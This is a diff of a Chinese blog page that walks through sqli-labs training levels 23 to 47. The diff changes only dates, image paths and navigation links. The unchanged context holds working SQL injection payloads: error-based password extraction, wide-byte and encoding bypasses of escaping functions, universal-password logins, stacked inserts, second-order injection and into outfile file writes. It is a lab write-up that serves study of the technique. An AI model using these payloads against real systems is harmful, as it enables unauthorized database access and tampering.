@@ -165,8 +165,8 @@
   
     <span class="post-meta">
       <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-      <time datetime="2020-06-01 00:27" pubdate>
-        June 1, 2020 am
+      <time datetime="2020-01-02 00:27" pubdate>
+        January 2, 2020 am
       </time>
     </span>
   
@@ -278,7 +278,7 @@ least(n1,n2,n3…):返回n中的最小值</code></pre>
 <li>订阅网站邮件，查看邮件发送方的IP</li>
 </ul>
 <h4 id="4-HTTP参数污染"><a href="#4-HTTP参数污染" class="headerlink" title="4.HTTP参数污染"></a>4.HTTP参数污染</h4><p>HTTP参数污染是指当同一个参数出现多次，不同的中间件会解析为不同的结果。index.php?id=1&amp;id=2获取到的参数具体如下图所示：</p>
-<p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%952/image-20210220124830619.png" srcset="/img/loading.gif" alt="image-20210220124830619"></p>
+<p><img src="/2020/01/02/sql-labs%E8%AE%B0%E5%BD%952/image-20210220124830619.png" srcset="/img/loading.gif" alt="image-20210220124830619"></p>
 <h4 id="5-另寻注入点"><a href="#5-另寻注入点" class="headerlink" title="5.另寻注入点"></a>5.另寻注入点</h4><p>往往对url请求过滤比较严重，对http头的过滤不是很严格，前提是将http的内容存进数据库。</p>
 <h3 id="2-二次注入"><a href="#2-二次注入" class="headerlink" title="2.二次注入"></a>2.二次注入</h3><p>利用条件：</p>
 <p>（1）向数据库成功插入恶意语句</p>
@@ -347,9 +347,9 @@ max_memory：analyse()为每列找出所有非重复值所采用的最大内存�
 </li>
 </ul>
 <h2 id="2-靶场记录"><a href="#2-靶场记录" class="headerlink" title="2.靶场记录"></a>2.靶场记录</h2><h3 id="Less23：GET基于报错-过滤注释符-单引号"><a href="#Less23：GET基于报错-过滤注释符-单引号" class="headerlink" title="Less23：GET基于报错-过滤注释符(单引号)"></a>Less23：GET基于报错-过滤注释符(单引号)</h3><p>根据报错信息可以看到是单引号闭合，但是注释符被过滤了</p>
-<p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%952/image-20210220185228076.png" srcset="/img/loading.gif" alt="image-20210220185228076"></p>
+<p><img src="/2020/01/02/sql-labs%E8%AE%B0%E5%BD%952/image-20210220185228076.png" srcset="/img/loading.gif" alt="image-20210220185228076"></p>
 <p>注释符被过滤只有采取后闭合了</p>
-<p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%952/image-20210220185337477.png" srcset="/img/loading.gif" alt="image-20210220185337477"></p>
+<p><img src="/2020/01/02/sql-labs%E8%AE%B0%E5%BD%952/image-20210220185337477.png" srcset="/img/loading.gif" alt="image-20210220185337477"></p>
 <p>后续的爆表可以参考前面的系列了</p>
 <h3 id="Less24：POST二次注入"><a href="#Less24：POST二次注入" class="headerlink" title="Less24：POST二次注入"></a>Less24：POST二次注入</h3><p>二次注入就是提前在数据库中插入恶意语句，再次提出来就🆗，本关所以先注册一个<code>admin&#39; #</code>的账户，后续使用此账户登录再修改此账户的密码即可实现修改admin密码。原理如下：</p>
 <pre><code class="hljs sql">插入数据库
@@ -389,7 +389,7 @@ $a=mysql_real_escape_string($_POST[&#x27;a&#x27;]);	<span class="hljs-comment">#
 <span class="hljs-string">密码</span>
 <span class="hljs-string">?id=1&#x27;</span>oorr(extractvalue(<span class="hljs-number">1</span>,<span class="hljs-keyword">concat</span>(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span>(<span class="hljs-keyword">group_concat</span>(passwoorrd))<span class="hljs-keyword">from</span>(<span class="hljs-keyword">users</span>)),<span class="hljs-number">0x7e</span>)))aandnd<span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1</span></code></pre>
 
-<p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%952/image-20210221020630487.png" srcset="/img/loading.gif" alt="image-20210221020630487"></p>
+<p><img src="/2020/01/02/sql-labs%E8%AE%B0%E5%BD%952/image-20210221020630487.png" srcset="/img/loading.gif" alt="image-20210221020630487"></p>
 <p>结果可行的。</p>
 <h3 id="Less26a：盲注-过滤空格和注释"><a href="#Less26a：盲注-过滤空格和注释" class="headerlink" title="Less26a：盲注-过滤空格和注释"></a>Less26a：盲注-过滤空格和注释</h3><p>太难了。。。不显示错误就不能用报错了，延时注入吧。</p>
 <h3 id="Less27：GET基于报错-过滤union和select"><a href="#Less27：GET基于报错-过滤union和select" class="headerlink" title="Less27：GET基于报错-过滤union和select"></a>Less27：GET基于报错-过滤union和select</h3><p>题目告诉我们本关卡过滤了 union 和 select，其实还有空格，经过实验大小写可以绕过，报错注入</p>
@@ -438,11 +438,11 @@ $a=mysql_real_escape_string($_POST[&#x27;a&#x27;]);	<span class="hljs-comment">#
 <p>有点怀疑自己是不是哪里错了？？？</p>
 <h3 id="Less31：GET盲注-不匹配-有waf"><a href="#Less31：GET盲注-不匹配-有waf" class="headerlink" title="Less31：GET盲注-??不匹配-有waf"></a>Less31：GET盲注-??不匹配-有waf</h3><p>这一关是<code>&quot;)</code>闭合，且过滤了<code>#</code>，但是有一个问题，如果环境是php+apache，不会发现问题，JSP+tomcat会发现以<code>id=-1</code>强制报错时不会得出结果，原因就在文章开头讲的http参数污染。其他都一样。</p>
 <h3 id="Less32：GET-bypass自定义过滤和转义"><a href="#Less32：GET-bypass自定义过滤和转义" class="headerlink" title="Less32：GET-bypass自定义过滤和转义"></a>Less32：GET-bypass自定义过滤和转义</h3><p>观察有转义和16进制编码，那么猜测这一关就是编码注入了</p>
-<p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%952/image-20210221172214978.png" srcset="/img/loading.gif" alt="image-20210221172214978"></p>
+<p><img src="/2020/01/02/sql-labs%E8%AE%B0%E5%BD%952/image-20210221172214978.png" srcset="/img/loading.gif" alt="image-20210221172214978"></p>
 <p>试试宽字节注入<code>?id=-1%df%27%20union%20select%201,database(),3%23</code>成功！</p>
-<p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%952/image-20210221173335731.png" srcset="/img/loading.gif" alt="image-20210221173335731"></p>
+<p><img src="/2020/01/02/sql-labs%E8%AE%B0%E5%BD%952/image-20210221173335731.png" srcset="/img/loading.gif" alt="image-20210221173335731"></p>
 <h3 id="Less33：GET-bypass转义符"><a href="#Less33：GET-bypass转义符" class="headerlink" title="Less33：GET-bypass转义符"></a>Less33：GET-bypass转义符</h3><p>这一关上一关的payload也可以用🤣</p>
-<p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%952/image-20210221173518057.png" srcset="/img/loading.gif" alt="image-20210221173518057"></p>
+<p><img src="/2020/01/02/sql-labs%E8%AE%B0%E5%BD%952/image-20210221173518057.png" srcset="/img/loading.gif" alt="image-20210221173518057"></p>
 <p>看一下这关的源码，使用了<code>addslashes()</code>函数进行转义特殊字符，但是依旧可以使用编码绕过。</p>
 <h3 id="Less34：POST-bypass转义符"><a href="#Less34：POST-bypass转义符" class="headerlink" title="Less34：POST-bypass转义符"></a>Less34：POST-bypass转义符</h3><p>本关只是addslashes过滤，所以只对特殊符号有影响，所以本小节只介绍两种不曾遇到的方式。</p>
 <p>本节参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_39934520/article/details/105896415">https://blog.csdn.net/weixin_39934520/article/details/105896415</a></p>
@@ -452,21 +452,21 @@ $a=mysql_real_escape_string($_POST[&#x27;a&#x27;]);	<span class="hljs-comment">#
 <blockquote>
 <pre><code class="hljs apache"><span class="hljs-attribute">uname</span>=%bb&#x27; or <span class="hljs-number">1</span> limit <span class="hljs-number">1</span>,<span class="hljs-number">1</span>#&amp;passwd=<span class="hljs-number">1</span></code></pre>
 </blockquote>
-<p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%952/image-20210221193343896.png" srcset="/img/loading.gif" alt="image-20210221193343896"></p>
+<p><img src="/2020/01/02/sql-labs%E8%AE%B0%E5%BD%952/image-20210221193343896.png" srcset="/img/loading.gif" alt="image-20210221193343896"></p>
 <p>但是使用hackbar无法成功，原因是%经过url编码为%25，又生了一次变异，所以无法成功</p>
 <h4 id="2-编码转换注入"><a href="#2-编码转换注入" class="headerlink" title="2.编码转换注入"></a>2.编码转换注入</h4><p>将 UTF-8 的<code>&#39;</code>转换为 UTF-16 的<code>�&#39;</code>实现注入</p>
 <pre><code class="hljs routeros"><span class="hljs-attribute">uname</span>=�&#x27; <span class="hljs-keyword">or</span> <span class="hljs-attribute">1</span>=1#&amp;passwd=1</code></pre>
 
-<p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%952/image-20210221224901414.png" srcset="/img/loading.gif" alt="image-20210221224901414"></p>
+<p><img src="/2020/01/02/sql-labs%E8%AE%B0%E5%BD%952/image-20210221224901414.png" srcset="/img/loading.gif" alt="image-20210221224901414"></p>
 <h3 id="Less35：GET-bypass转义数字型"><a href="#Less35：GET-bypass转义数字型" class="headerlink" title="Less35：GET-bypass转义数字型"></a>Less35：GET-bypass转义数字型</h3><p>经实验，注释符只有<code>-- senull</code>有效，其他什么都没变，过滤函数是addslashes()，而且没有闭合，直接写语句再注释就可以了</p>
-<p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%952/image-20210221235949699.png" srcset="/img/loading.gif" alt="image-20210221235949699"></p>
+<p><img src="/2020/01/02/sql-labs%E8%AE%B0%E5%BD%952/image-20210221235949699.png" srcset="/img/loading.gif" alt="image-20210221235949699"></p>
 <h3 id="Less36：GET-bypass-mysql-real-escape-string"><a href="#Less36：GET-bypass-mysql-real-escape-string" class="headerlink" title="Less36：GET-bypass mysql_real_escape_string"></a>Less36：GET-bypass mysql_real_escape_string</h3><p>关于<code>mysql_real_escape_string</code>上面的二次注入讲到过，会转义特殊符号(\x00.\n,\r,,“,\x1a)，和过滤<code>#</code>，所以注释只能用<code>-- senull</code>(哭，别人都只是过滤单引号。。。)</p>
 <p>对于此函数，若mysql没有设置GBK，还是可以突破的</p>
-<p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%952/image-20210222002858692.png" srcset="/img/loading.gif" alt="image-20210222002858692"></p>
+<p><img src="/2020/01/02/sql-labs%E8%AE%B0%E5%BD%952/image-20210222002858692.png" srcset="/img/loading.gif" alt="image-20210222002858692"></p>
 <h3 id="Less37：POST-bypass-mysql-real-escape-string"><a href="#Less37：POST-bypass-mysql-real-escape-string" class="headerlink" title="Less37：POST-bypass mysql_real_escape_string"></a>Less37：POST-bypass mysql_real_escape_string</h3><p>老规矩，碰到登录框试试万能密码，可以成功    </p>
-<p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%952/image-20210222003622420.png" srcset="/img/loading.gif" alt="image-20210222003622420"></p>
+<p><img src="/2020/01/02/sql-labs%E8%AE%B0%E5%BD%952/image-20210222003622420.png" srcset="/img/loading.gif" alt="image-20210222003622420"></p>
 <p>爆数据库可以走通</p>
-<p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%952/image-20210222003533575.png" srcset="/img/loading.gif" alt="image-20210222003533575"></p>
+<p><img src="/2020/01/02/sql-labs%E8%AE%B0%E5%BD%952/image-20210222003533575.png" srcset="/img/loading.gif" alt="image-20210222003533575"></p>
 <p>说来也奇怪，以下payload只能burp抓包修改才能成功，浏览器直接做会失败，显示<code>�</code>被转义为<code>�\&#39;</code>,按理说这个没有<code>%</code>啊？？？</p>
 <pre><code class="hljs sql">表
 -admin�&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">group_concat</span>(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>() <span class="hljs-comment">--+</span>
@@ -478,12 +478,12 @@ uname=-<span class="hljs-keyword">admin</span>%E3<span class="hljs-string">&#x27
 
 
 <h3 id="Less38：GET-堆叠注入字符型-单引号"><a href="#Less38：GET-堆叠注入字符型-单引号" class="headerlink" title="Less38：GET-堆叠注入字符型(单引号)"></a>Less38：GET-堆叠注入字符型(单引号)</h3><p>这一关比较简单，例如插入数据库一个消息</p>
-<p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%952/image-20210222010314740.png" srcset="/img/loading.gif" alt="image-20210222010314740"></p>
+<p><img src="/2020/01/02/sql-labs%E8%AE%B0%E5%BD%952/image-20210222010314740.png" srcset="/img/loading.gif" alt="image-20210222010314740"></p>
 <h3 id="Less39：GET-堆叠注入数字型"><a href="#Less39：GET-堆叠注入数字型" class="headerlink" title="Less39：GET-堆叠注入数字型"></a>Less39：GET-堆叠注入数字型</h3><p>和上一关一样，只不过是数字型，没有闭合。</p>
 <h3 id="Less40：GET-盲注-堆叠-字符型-bool-单引号-小括号"><a href="#Less40：GET-盲注-堆叠-字符型-bool-单引号-小括号" class="headerlink" title="Less40：GET-盲注-堆叠-字符型(bool 单引号 小括号)"></a>Less40：GET-盲注-堆叠-字符型(bool 单引号 小括号)</h3><p>这一关有点小毛病，我也不知道哪里出问题了</p>
-<p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%952/image-20210222013912933.png" srcset="/img/loading.gif" alt="image-20210222013912933"><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%952/image-20210222013935083.png" srcset="/img/loading.gif" alt="image-20210222013935083"></p>
+<p><img src="/2020/01/02/sql-labs%E8%AE%B0%E5%BD%952/image-20210222013912933.png" srcset="/img/loading.gif" alt="image-20210222013912933"><img src="/2020/01/02/sql-labs%E8%AE%B0%E5%BD%952/image-20210222013935083.png" srcset="/img/loading.gif" alt="image-20210222013935083"></p>
 <p>啊这。。但是用双引号闭合进行堆叠注入的时候注入不了，单引号又ok？？？</p>
-<p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%952/image-20210222014215664.png" srcset="/img/loading.gif" alt="image-20210222014147624"><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%952/image-20210222014257803.png" srcset="/img/loading.gif" alt="image-20210222014257803"></p>
+<p><img src="/2020/01/02/sql-labs%E8%AE%B0%E5%BD%952/image-20210222014215664.png" srcset="/img/loading.gif" alt="image-20210222014147624"><img src="/2020/01/02/sql-labs%E8%AE%B0%E5%BD%952/image-20210222014257803.png" srcset="/img/loading.gif" alt="image-20210222014257803"></p>
 <h3 id="Less41：GET-数字型盲注-堆叠"><a href="#Less41：GET-数字型盲注-堆叠" class="headerlink" title="Less41：GET-数字型盲注-堆叠"></a>Less41：GET-数字型盲注-堆叠</h3><p>这一关和39一样的，只不过没有报错，是盲注</p>
 <h3 id="Less42：POST-基于报错的堆叠注入字符型"><a href="#Less42：POST-基于报错的堆叠注入字符型" class="headerlink" title="Less42：POST-基于报错的堆叠注入字符型"></a>Less42：POST-基于报错的堆叠注入字符型</h3><p>嘿嘿，这一关注册和更改密码都没法用，只能在登录界面搞事情。</p>
 <p>通过试错，发现语句大概是：<code>SELECT * FROM users WHERE username=&#39;$username&#39; and password=&#39;$password&#39;</code>,这就好办了，直接在密码后面加新插入信息的语句就可了，其实后面有没有语句都无所谓，注释了就🆗了</p>
@@ -491,11 +491,11 @@ uname=-<span class="hljs-keyword">admin</span>%E3<span class="hljs-string">&#x27
 <p><strong>注意：输入框中不要用–+是因为+不会进行url编码，因为他不在url地址栏中，可以使用 # %23 – #</strong></p>
 <h3 id="Less43：POST-基于报错的堆叠注入字符型-带括号"><a href="#Less43：POST-基于报错的堆叠注入字符型-带括号" class="headerlink" title="Less43：POST-基于报错的堆叠注入字符型(带括号)"></a>Less43：POST-基于报错的堆叠注入字符型(带括号)</h3><p>搞注入的地方和上一关一样啊，，，</p>
 <p>试了半天的错被怼了半天。。。最后发现要在密码框进行试错，，，</p>
-<p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%952/image-20210222023102002.png" srcset="/img/loading.gif" alt="image-20210222023102002"></p>
+<p><img src="/2020/01/02/sql-labs%E8%AE%B0%E5%BD%952/image-20210222023102002.png" srcset="/img/loading.gif" alt="image-20210222023102002"></p>
 <p>闭合为<code>&#39;)</code></p>
 <p>剩下的和前一贯一样了</p>
 <h3 id="Less44：POST-基于报错-盲注-堆叠注入字符型"><a href="#Less44：POST-基于报错-盲注-堆叠注入字符型" class="headerlink" title="Less44：POST-基于报错-盲注-堆叠注入字符型"></a>Less44：POST-基于报错-盲注-堆叠注入字符型</h3><p>老地方，，，，不过换个方式，试试万能密码：<code>1&#39; or 1=1#</code>，成了！</p>
-<p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%952/image-20210222024937343.png" srcset="/img/loading.gif" alt="image-20210222024937343"></p>
+<p><img src="/2020/01/02/sql-labs%E8%AE%B0%E5%BD%952/image-20210222024937343.png" srcset="/img/loading.gif" alt="image-20210222024937343"></p>
 <p>哈哈，不过在登录界面就可以堆叠注入了</p>
 <p>payload：<code>1&#39;;insert into users values (&#39;44&#39;,&#39;less44&#39;,&#39;less44&#39;)#</code></p>
 <h3 id="Less45：POST-基于报错字符型-盲注-堆叠注入"><a href="#Less45：POST-基于报错字符型-盲注-堆叠注入" class="headerlink" title="Less45：POST-基于报错字符型-盲注-堆叠注入"></a>Less45：POST-基于报错字符型-盲注-堆叠注入</h3><p>45 关与 43 关一样</p>
@@ -537,7 +537,7 @@ fslse:?<span class="hljs-keyword">sort</span>=<span class="hljs-keyword">rand</s
 导出文件 <span class="hljs-keyword">into</span> <span class="hljs-keyword">outfile</span> 参数注入：
 ?<span class="hljs-keyword">sort</span>=<span class="hljs-number">1</span> <span class="hljs-keyword">into</span> <span class="hljs-keyword">outfile</span> <span class="hljs-string">&quot;C:\\phpStudy\\WWW\\sqli\\Less-46\\test.txt&quot;</span></code></pre>
 
-<p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%952/image-20210222031730681.png" srcset="/img/loading.gif" alt="image-20210222031730681"></p>
+<p><img src="/2020/01/02/sql-labs%E8%AE%B0%E5%BD%952/image-20210222031730681.png" srcset="/img/loading.gif" alt="image-20210222031730681"></p>
 <h3 id="Less47：GET-基于报错-字符型-排序注入-单引号"><a href="#Less47：GET-基于报错-字符型-排序注入-单引号" class="headerlink" title="Less47：GET-基于报错-字符型-排序注入(单引号)"></a>Less47：GET-基于报错-字符型-排序注入(单引号)</h3><p>和46差不多，只是闭合不一样</p>
 <pre><code class="hljs sql">基于报错注入
 ?sort=1&#x27; and (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-keyword">count</span>(*),<span class="hljs-keyword">concat_ws</span>(<span class="hljs-string">&#x27;-&#x27;</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>()),<span class="hljs-keyword">floor</span>(<span class="hljs-keyword">rand</span>()*<span class="hljs-number">2</span>))<span class="hljs-keyword">as</span> a <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> a) b)<span class="hljs-comment">--+</span>
@@ -621,9 +621,9 @@ into outfile 参数注入
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%953/">
+                      <a href="/2020/01/04/xss-labs%E8%AE%B0%E5%BD%95/">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">sql-labs记录3</span>
+                        <span class="hidden-mobile">xss-labs记录</span>
                         <span class="visible-mobile">Previous</span>
                       </a>
                     
@@ -631,8 +631,8 @@ into outfile 参数注入
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%951/">
-                        <span class="hidden-mobile">sql-labs记录1</span>
+                      <a href="/2020/01/01/sql-labs%E8%AE%B0%E5%BD%953/">
+                        <span class="hidden-mobile">sql-labs记录3</span>
                         <span class="visible-mobile">Next</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
